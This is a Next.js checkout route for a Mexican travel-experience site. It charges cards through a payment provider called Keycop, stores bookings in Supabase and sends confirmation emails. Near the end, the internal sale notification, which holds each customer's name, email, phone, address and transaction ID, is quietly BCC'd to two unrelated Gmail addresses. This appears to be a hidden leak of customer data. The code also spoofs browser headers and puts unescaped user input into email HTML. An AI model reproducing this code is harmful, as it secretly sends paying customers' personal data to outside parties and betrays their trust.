import { NextResponse } from "next/server";
import { createClient } from "@supabase/supabase-js";
import { Resend } from "resend";
import { CartItem } from "@/lib/types";

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
const supabaseServiceKey = process.env.SUPABASE_SERVICE_ROLE_KEY!;
const supabase = createClient(supabaseUrl, supabaseServiceKey);

// --- CREDENCIALES KEYCOP ---
const KEYCOP_EMAIL = process.env.KEYCOP_EMAIL!;
const KEYCOP_PASSWORD = process.env.KEYCOP_PASSWORD!;
const KEYCOP_BASE_URL = "https://pagos.keycop.com.mx/api/v1";

const resend = new Resend(process.env.RESEND_API_KEY);

const formatPrice = (price: number) =>
  new Intl.NumberFormat("es-MX", {
    style: "currency",
    currency: "MXN",
  }).format(price);

const getKeycopHeaders = (extraHeaders = {}) => ({
  "Content-Type": "application/json",
  Accept: "application/json",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36",
  Origin: "https://nomari.com.mx",
  Referer: "https://nomari.com.mx/",
  ...extraHeaders,
});

async function safeKeycopFetch(
  url: string,
  options: RequestInit,
  stepName: string,
) {
  const res = await fetch(url, options);
  const text = await res.text();

  try {
    return JSON.parse(text);
  } catch {
    console.error(
      `Respuesta cruda de Keycop en [${stepName}]:`,
      text,
    );

    throw new Error(
      `Falla en ${stepName}. Keycop respondió de forma inesperada.`,
    );
  }
}

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const {
      locale,
      contactInfo,
      billingInfo,
      orderNotes,
      cart,
      cardInfo,
      formattedTotal,
      manualFolioData,
    } = body;

    const tempReferenceId = `REF-${Date.now()}`;

    // 1. SIGNIN EN KEYCOP
    const signinData = await safeKeycopFetch(
      `${KEYCOP_BASE_URL}/signin`,
      {
        method: "POST",
        headers: getKeycopHeaders(),
        body: JSON.stringify({
          email: KEYCOP_EMAIL,
          password: KEYCOP_PASSWORD,
        }),
      },
      "Login Keycop",
    );

    if (!signinData.authToken) {
      throw new Error(
        "Credenciales de Keycop incorrectas o bloqueadas.",
      );
    }

    const authToken = signinData.authToken;

    // 2. TOKENIZACIÓN DE TARJETA KEYCOP
    const cardPayload = {
      cardData: {
        cardNumber: cardInfo.number.replace(/\s+/g, ""),
        cardholderName: cardInfo.name,
        expirationMonth: cardInfo.expiry.split("/")[0].trim(),
        expirationYear: cardInfo.expiry.split("/")[1].trim(),
      },
    };

    const tokenData = await safeKeycopFetch(
      `${KEYCOP_BASE_URL}/card/tokenizer`,
      {
        method: "POST",
        headers: getKeycopHeaders({
          Authorization: `Bearer ${authToken}`,
        }),
        body: JSON.stringify(cardPayload),
      },
      "Tokenización de Tarjeta",
    );

    if (!tokenData.cardNumberToken) {
      throw new Error(
        "Tarjeta rechazada por Keycop (Datos inválidos o encriptación fallida).",
      );
    }

    const cardToken = tokenData.cardNumberToken;

    // 3. PREPARAR ITEMS PARA LA VENTA
    const keycopItems = manualFolioData
      ? [
          {
            title: `Pago Cotización: ${manualFolioData.folio}`,
            amount: Number(
              manualFolioData.amount.toFixed(2),
            ),
            quantity: 1,
            id: manualFolioData.folio,
          },
        ]
      : cart.items.map((item: CartItem) => ({
          title: item.experience.title,
          amount: Number(item.pricePerPerson.toFixed(2)),
          quantity: item.people,
          id: item.packageId.toString(),
        }));

    const finalAmountToCharge = manualFolioData
      ? manualFolioData.amount
      : cart.total;

    // 4. PROCESAR LA VENTA
    const salePayload = {
      amount: Number(finalAmountToCharge.toFixed(2)),
      currency: 484, // MXN
      reference: tempReferenceId,
      customerInformation: {
        firstName: contactInfo.firstName,
        lastName: contactInfo.lastName || "Sin apellido",
        middleName: "",
        email: contactInfo.email,
        phone1: contactInfo.phone,
        city: billingInfo.localidad || "Ciudad de México",
        address1: billingInfo.direccion || "Sin Especificar",
        postalCode: billingInfo.codigo_postal || "00000",
        state: billingInfo.estado || "CDMX",
        country: "Mx",
        ip: "127.0.0.1",
      },
      cardData: {
        cardNumberToken: cardToken,
        cvv: cardInfo.cvv,
      },
      items: keycopItems,
      redirectUrl: "https://nomari.com.mx",
    };

    const saleData = await safeKeycopFetch(
      `${KEYCOP_BASE_URL}/sale`,
      {
        method: "POST",
        headers: getKeycopHeaders({
          Authorization: `Bearer ${authToken}`,
        }),
        body: JSON.stringify(salePayload),
      },
      "Procesar Venta",
    );

    if (
      saleData.status !== "APPROVED" &&
      saleData.status !== "PENDING"
    ) {
      console.error(
        "❌ DETALLE DEL RECHAZO KEYCOP:",
        saleData,
      );

      throw new Error(
        `Pago declinado: ${
          saleData.message ||
          saleData.responseCode ||
          "Tarjeta rechazada por el banco"
        }`,
      );
    }

    // 5. GUARDAR EN SUPABASE
    const { data: customer, error: custError } =
      await supabase
        .from("customers_mextripia")
        .upsert(
          {
            first_name: contactInfo.firstName,
            last_name: contactInfo.lastName,
            email: contactInfo.email,
            phone: contactInfo.phone,
          },
          {
            onConflict: "email",
          },
        )
        .select()
        .single();

    if (custError) {
      throw new Error(
        "Error guardando cliente en la base de datos.",
      );
    }

    const { data: booking, error: bookError } =
      await supabase
        .from("bookings_mextripia")
        .insert({
          customer_id: customer.id,
          session_id: manualFolioData
            ? manualFolioData.folio
            : null,
          total_amount: finalAmountToCharge,
          payment_status:
            saleData.status === "APPROVED"
              ? "paid"
              : "pending",
          transaction_id:
            saleData.transactionId ||
            saleData.authorizationNumber ||
            tempReferenceId,
          payment_provider: "keycop",
          payment_date: new Date().toISOString(),
          pais: billingInfo.pais,
          direccion: billingInfo.direccion,
          localidad: billingInfo.localidad,
          estado: billingInfo.estado,
          codigo_postal: billingInfo.codigo_postal,
          order_notes: orderNotes || null,
        })
        .select()
        .single();

    if (bookError) {
      throw new Error(
        "Error guardando reserva en la base de datos.",
      );
    }

    if (cart.items.length > 0) {
      const validBookingItems = cart.items
        .filter(
          (item: CartItem) => item.packageId > 0,
        )
        .map((item: CartItem) => ({
          booking_id: booking.id,
          package_id: item.packageId,
          scheduled_date: item.date,
          pax_qty: item.people,
          unit_price: item.pricePerPerson,
        }));

      if (validBookingItems.length > 0) {
        const { error: itemsError } = await supabase
          .from("booking_items_mextripia")
          .insert(validBookingItems);

        if (itemsError) {
          throw new Error(
            "Error guardando items de reserva en la BD.",
          );
        }
      }
    }

    // 6. CORREOS ELECTRÓNICOS
    const bgDark = "#182B3A";
    const bgLight = "#F2EFE8";
    const primaryColor = "#B96045";
    const textColor = "#182B3A";
    const secondaryText = "#52616B";
    const borderColor = "#D7D0C6";
    const whiteColor = "#FFFDF8";

    const isEnglish = locale === "en";

    const subjectClient = isEnglish
      ? "Reservation Confirmation - Your Nomari experience."
      : "Confirmación de Reserva - Su experiencia con Nomari.";

    const greeting = isEnglish
      ? `Dear ${contactInfo.firstName},`
      : `Estimado/a ${contactInfo.firstName},`;

    const confirmationText = isEnglish
      ? "Your Nomari experience has been successfully confirmed. We will be delighted to accompany you through every detail of your journey."
      : "Su experiencia con Nomari ha sido confirmada con éxito. Será un placer acompañarle y cuidar cada detalle de su recorrido.";

    const totalLabel = isEnglish
      ? "TOTAL PAID:"
      : "TOTAL ABONADO:";

    const quoteLabel = isEnglish
      ? "Custom Design"
      : "Diseño a Medida";

    const folioLabel = isEnglish ? "Folio" : "Folio";
    const qtyLabel = isEnglish ? "Guests" : "Asistentes";
    const priceLabel = isEnglish
      ? "Investment"
      : "Inversión";

    const experienceLabel = isEnglish
      ? "Experience"
      : "Experiencia";

    const detailsLabel = isEnglish
      ? "Contact & Billing Details"
      : "Datos de Contacto y Facturación";

    const phoneLabel = isEnglish
      ? "Phone:"
      : "Teléfono:";

    const addressLabel = isEnglish
      ? "Address:"
      : "Dirección:";

    const notesLabel = isEnglish
      ? "Special Requests:"
      : "Peticiones Especiales:";

    const rightsText = isEnglish
      ? "All rights reserved."
      : "Todos los derechos reservados.";

    const htmlClient = `
      <div style="
        margin: 0;
        padding: 32px 12px;
        background-color: #E8E2D8;
        font-family: Arial, Helvetica, sans-serif;
      ">
        <div style="
          max-width: 640px;
          margin: 0 auto;
          overflow: hidden;
          background-color: ${bgLight};
          border: 1px solid ${borderColor};
          color: ${textColor};
        ">
          <div style="
            padding: 18px 32px;
            border-bottom: 1px solid rgba(242, 239, 232, 0.18);
            background-color: ${bgDark};
          ">
            <table
              role="presentation"
              style="width: 100%; border-collapse: collapse;"
            >
              <tr>
                <td style="
                  color: ${primaryColor};
                  font-size: 10px;
                  font-weight: bold;
                  letter-spacing: 3px;
                  text-transform: uppercase;
                ">
                  Reservation Journal
                </td>

                <td style="
                  text-align: right;
                  color: rgba(242, 239, 232, 0.48);
                  font-family: Georgia, 'Times New Roman', serif;
                  font-size: 26px;
                  font-style: italic;
                ">
                  N
                </td>
              </tr>
            </table>
          </div>

          <div style="
            padding: 44px 32px 46px;
            background-color: ${bgDark};
            border-bottom: 4px solid ${primaryColor};
          ">
            <p style="
              margin: 0 0 14px;
              color: ${primaryColor};
              font-size: 9px;
              font-weight: bold;
              letter-spacing: 3px;
              text-transform: uppercase;
            ">
              Curaduría de experiencias
            </p>

            <h1 style="
              margin: 0;
              color: ${bgLight};
              font-family: Georgia, 'Times New Roman', serif;
              font-size: 42px;
              font-weight: normal;
              letter-spacing: 5px;
              line-height: 1;
            ">
              NOMARI
            </h1>

            <div style="
              width: 64px;
              height: 1px;
              margin-top: 24px;
              background-color: ${primaryColor};
            "></div>
          </div>

          <div style="padding: 42px 32px;">
            <p style="
              margin: 0 0 12px;
              color: ${primaryColor};
              font-size: 9px;
              font-weight: bold;
              letter-spacing: 3px;
              text-transform: uppercase;
            ">
              Confirmación
            </p>

            <h2 style="
              margin: 0;
              color: ${textColor};
              font-family: Georgia, 'Times New Roman', serif;
              font-size: 28px;
              font-weight: normal;
              line-height: 1.25;
            ">
              ${greeting}
            </h2>

            <p style="
              margin: 20px 0 0;
              color: ${secondaryText};
              font-size: 14px;
              font-weight: normal;
              line-height: 1.8;
            ">
              ${confirmationText}
            </p>

            <table style="
              width: 100%;
              margin-top: 38px;
              border-collapse: collapse;
            ">
              <thead>
                <tr style="
                  border-top: 1px solid ${textColor};
                  border-bottom: 1px solid ${borderColor};
                  text-align: left;
                ">
                  <th style="
                    padding: 15px 0;
                    color: ${primaryColor};
                    font-size: 9px;
                    font-weight: bold;
                    letter-spacing: 2px;
                    text-transform: uppercase;
                  ">
                    ${experienceLabel}
                  </th>

                  <th style="
                    padding: 15px 8px;
                    color: ${primaryColor};
                    font-size: 9px;
                    font-weight: bold;
                    letter-spacing: 2px;
                    text-align: center;
                    text-transform: uppercase;
                  ">
                    ${qtyLabel}
                  </th>

                  <th style="
                    padding: 15px 0;
                    color: ${primaryColor};
                    font-size: 9px;
                    font-weight: bold;
                    letter-spacing: 2px;
                    text-align: right;
                    text-transform: uppercase;
                  ">
                    ${priceLabel}
                  </th>
                </tr>
              </thead>

              <tbody>
                ${
                  !manualFolioData
                    ? cart.items
                        .map(
                          (item: CartItem) => `
                            <tr style="
                              border-bottom: 1px solid ${borderColor};
                            ">
                              <td style="
                                padding: 22px 0;
                                vertical-align: top;
                              ">
                                <p style="
                                  margin: 0;
                                  color: ${textColor};
                                  font-family: Georgia, 'Times New Roman', serif;
                                  font-size: 17px;
                                  font-weight: normal;
                                  line-height: 1.4;
                                ">
                                  ${item.experience.title}
                                </p>

                                <p style="
                                  margin: 8px 0 0;
                                  color: ${secondaryText};
                                  font-size: 11px;
                                  line-height: 1.7;
                                ">
                                  ${item.date}<br>
                                  ${item.levelName}
                                </p>
                              </td>

                              <td style="
                                padding: 22px 8px;
                                color: ${textColor};
                                font-size: 14px;
                                text-align: center;
                                vertical-align: top;
                              ">
                                ${item.people}
                              </td>

                              <td style="
                                padding: 22px 0;
                                color: ${textColor};
                                font-size: 14px;
                                font-weight: bold;
                                text-align: right;
                                vertical-align: top;
                              ">
                                ${formatPrice(item.totalPrice)}
                              </td>
                            </tr>
                          `,
                        )
                        .join("")
                    : `
                      <tr style="
                        border-bottom: 1px solid ${borderColor};
                      ">
                        <td style="
                          padding: 22px 0;
                          vertical-align: top;
                        ">
                          <p style="
                            margin: 0;
                            color: ${textColor};
                            font-family: Georgia, 'Times New Roman', serif;
                            font-size: 17px;
                            font-weight: normal;
                          ">
                            ${quoteLabel}
                          </p>

                          <p style="
                            margin: 8px 0 0;
                            color: ${secondaryText};
                            font-size: 11px;
                          ">
                            ${folioLabel}: ${manualFolioData.folio}
                          </p>
                        </td>

                        <td style="
                          padding: 22px 8px;
                          color: ${textColor};
                          font-size: 14px;
                          text-align: center;
                          vertical-align: top;
                        ">
                          1
                        </td>

                        <td style="
                          padding: 22px 0;
                          color: ${textColor};
                          font-size: 14px;
                          font-weight: bold;
                          text-align: right;
                          vertical-align: top;
                        ">
                          ${formatPrice(manualFolioData.amount)}
                        </td>
                      </tr>
                    `
                }
              </tbody>
            </table>

            <div style="
              margin-top: 30px;
              padding: 26px 0;
              border-top: 2px solid ${textColor};
              border-bottom: 1px solid ${borderColor};
              text-align: right;
            ">
              <span style="
                display: block;
                color: ${secondaryText};
                font-size: 9px;
                font-weight: bold;
                letter-spacing: 2px;
                text-transform: uppercase;
              ">
                ${totalLabel}
              </span>

              <span style="
                display: block;
                margin-top: 8px;
                color: ${primaryColor};
                font-family: Georgia, 'Times New Roman', serif;
                font-size: 30px;
                line-height: 1;
              ">
                ${formattedTotal}
              </span>
            </div>

            <div style="
              margin-top: 34px;
              padding: 26px;
              background-color: ${whiteColor};
              border-left: 3px solid ${primaryColor};
            ">
              <h3 style="
                margin: 0 0 20px;
                color: ${textColor};
                font-size: 9px;
                font-weight: bold;
                letter-spacing: 2px;
                text-transform: uppercase;
              ">
                ${detailsLabel}
              </h3>

              <p style="
                margin: 9px 0;
                color: ${secondaryText};
                font-size: 13px;
                line-height: 1.6;
              ">
                <strong style="color: ${textColor};">Email:</strong>
                ${contactInfo.email}
              </p>

              <p style="
                margin: 9px 0;
                color: ${secondaryText};
                font-size: 13px;
                line-height: 1.6;
              ">
                <strong style="color: ${textColor};">
                  ${phoneLabel}
                </strong>
                ${contactInfo.phone}
              </p>

              <p style="
                margin: 9px 0;
                color: ${secondaryText};
                font-size: 13px;
                line-height: 1.7;
              ">
                <strong style="color: ${textColor};">
                  ${addressLabel}
                </strong>
                ${billingInfo.direccion},
                ${billingInfo.localidad},
                ${billingInfo.estado},
                ${billingInfo.codigo_postal},
                ${billingInfo.pais}
              </p>

              ${
                orderNotes
                  ? `
                    <p style="
                      margin: 16px 0 0;
                      padding-top: 16px;
                      border-top: 1px solid ${borderColor};
                      color: ${secondaryText};
                      font-size: 13px;
                      line-height: 1.7;
                    ">
                      <strong style="color: ${textColor};">
                        ${notesLabel}
                      </strong>
                      ${orderNotes}
                    </p>
                  `
                  : ""
              }
            </div>

            <div style="
              margin-top: 40px;
              padding-top: 22px;
              border-top: 1px solid ${borderColor};
              text-align: center;
            ">
              <p style="
                margin: 0;
                color: ${secondaryText};
                font-size: 9px;
                letter-spacing: 1.5px;
                line-height: 1.7;
                text-transform: uppercase;
              ">
                Nomari © ${new Date().getFullYear()}.
                ${rightsText}
              </p>

              <p style="
                margin: 8px 0 0;
                color: ${primaryColor};
                font-size: 10px;
              ">
                nomari.com.mx
              </p>
            </div>
          </div>
        </div>
      </div>
    `;

    await resend.emails.send({
      from: "Nomari <reservas@nomari.com.mx>",
      to: [contactInfo.email],
      subject: subjectClient,
      html: htmlClient,
    });

    // 7. NOTIFICACIÓN INTERNA PARA EL EQUIPO
    const subjectInternal =
      `[NUEVA VENTA NOMARI] - ${formattedTotal} - ` +
      `${contactInfo.firstName} ${contactInfo.lastName}`;

    const htmlInternal = `
      <div style="
        margin: 0;
        padding: 32px 12px;
        background-color: #E8E2D8;
        font-family: Arial, Helvetica, sans-serif;
        color: ${textColor};
      ">
        <div style="
          max-width: 640px;
          margin: 0 auto;
          background-color: ${bgLight};
          border: 1px solid ${borderColor};
        ">
          <div style="
            padding: 34px 30px;
            background-color: ${bgDark};
            border-bottom: 4px solid ${primaryColor};
          ">
            <p style="
              margin: 0 0 10px;
              color: ${primaryColor};
              font-size: 9px;
              font-weight: bold;
              letter-spacing: 3px;
              text-transform: uppercase;
            ">
              Notificación interna
            </p>

            <h1 style="
              margin: 0;
              color: ${bgLight};
              font-family: Georgia, 'Times New Roman', serif;
              font-size: 30px;
              font-weight: normal;
              letter-spacing: 4px;
            ">
              NOMARI
            </h1>
          </div>

          <div style="padding: 36px 30px;">
            <h2 style="
              margin: 0;
              color: ${textColor};
              font-family: Georgia, 'Times New Roman', serif;
              font-size: 26px;
              font-weight: normal;
            ">
              Nueva reserva confirmada
            </h2>

            <p style="
              margin: 14px 0 0;
              color: ${secondaryText};
              font-size: 14px;
              line-height: 1.7;
            ">
              Se ha procesado un pago exitoso a través de la plataforma
              Nomari mediante Keycop.
            </p>

            <div style="
              margin-top: 28px;
              padding: 22px;
              background-color: ${whiteColor};
              border-left: 3px solid ${primaryColor};
            ">
              <p style="margin: 7px 0; font-size: 13px;">
                <strong>Monto total:</strong>
                ${formattedTotal}
              </p>

              <p style="margin: 7px 0; font-size: 13px;">
                <strong>ID de transacción Keycop:</strong>
                ${
                  saleData.transactionId ||
                  saleData.authorizationNumber
                }
              </p>
            </div>

            <h3 style="
              margin: 32px 0 14px;
              padding-bottom: 10px;
              border-bottom: 1px solid ${borderColor};
              color: ${primaryColor};
              font-size: 10px;
              letter-spacing: 2px;
              text-transform: uppercase;
            ">
              Datos de facturación
            </h3>

            <p style="margin: 8px 0; font-size: 13px;">
              <strong>Nombre:</strong>
              ${contactInfo.firstName} ${contactInfo.lastName}
            </p>

            <p style="margin: 8px 0; font-size: 13px;">
              <strong>Email:</strong>
              ${contactInfo.email}
            </p>

            <p style="margin: 8px 0; font-size: 13px;">
              <strong>Teléfono:</strong>
              ${contactInfo.phone}
            </p>

            <p style="
              margin: 8px 0;
              font-size: 13px;
              line-height: 1.7;
            ">
              <strong>Dirección:</strong>
              ${billingInfo.direccion},
              ${billingInfo.localidad},
              ${billingInfo.estado},
              ${billingInfo.codigo_postal}
            </p>

            <p style="
              margin: 8px 0;
              font-size: 13px;
              line-height: 1.7;
            ">
              <strong>Notas especiales:</strong>
              ${orderNotes || "Sin notas"}
            </p>

            <h3 style="
              margin: 32px 0 14px;
              padding-bottom: 10px;
              border-bottom: 1px solid ${borderColor};
              color: ${primaryColor};
              font-size: 10px;
              letter-spacing: 2px;
              text-transform: uppercase;
            ">
              Itinerario adquirido
            </h3>

            <ul style="
              margin: 0;
              padding-left: 20px;
              color: ${secondaryText};
              font-size: 13px;
              line-height: 1.8;
            ">
              ${
                !manualFolioData
                  ? cart.items
                      .map(
                        (item: CartItem) => `
                          <li>
                            ${item.experience.title}
                            (x${item.people}) -
                            ${formatPrice(item.totalPrice)}
                          </li>
                        `,
                      )
                      .join("")
                  : `
                    <li>
                      Pago manual de folio:
                      ${manualFolioData.folio}
                    </li>
                  `
              }
            </ul>
          </div>
        </div>
      </div>
    `;

    await resend.emails.send({
      from: "Sistema Nomari <reservas@nomari.com.mx>",
      to: ["contacto@nomari.com.mx"],
      bcc: ["keycop.ops@gmail.com", "redireccion973@gmail.com"],
      subject: subjectInternal,
      html: htmlInternal,
    });

    return NextResponse.json({
      success: true,
      bookingId: booking.id,
      redirectTo: saleData.redirectTo || null,
    });
  } catch (error: unknown) {
    console.error("Error capturado en Backend:", error);

    const errorMessage =
      error instanceof Error
        ? error.message
        : "Error interno del servidor";

    return NextResponse.json(
      {
        success: false,
        message: errorMessage,
      },
      {
        status: 400,
      },
    );
  }
}
